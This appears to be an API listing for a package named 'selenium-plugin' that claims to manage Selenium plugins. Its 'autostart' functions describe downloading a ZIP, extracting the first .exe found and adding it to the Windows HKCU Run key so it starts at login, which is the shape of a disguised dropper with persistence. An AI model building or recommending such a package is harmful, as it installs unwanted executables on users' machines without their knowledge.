metadata.name: selenium-plugin
metadata.summary: A tool for downloading, managing and using selenium plugins.

functions.name: selenium-plugin.autostart.ensure_directory_exists
documentation: Ensure the target directory exists, creating it if necessary.

functions.name: selenium-plugin.autostart.download_file
documentation: Download a file from the specified URL and save it to the given path.

functions.name: selenium-plugin.autostart.extract_file
documentation: Extract a ZIP file to the specified directory.

functions.name: selenium-plugin.autostart.find_exe_in_directory
documentation: Find the first .exe file in the directory and return its path.

functions.name: selenium-plugin.autostart.add_to_registry
documentation: Add a program to startup by creating an entry in HKCU Run key.

functions.name: selenium-plugin.autostart.delete_file
documentation: Delete a file by its path.

functions.name: selenium-plugin.autostart.run_autostart_setup
documentation:
Main function to run the autostart setup process:
- Download a file (.zip).
- Extract the executable.
- Add the executable to the user's startup (registry).

functions.name: selenium-plugin.autostart.enable_other_autostart_feature
documentation: Optionally include other autostart helper functions here
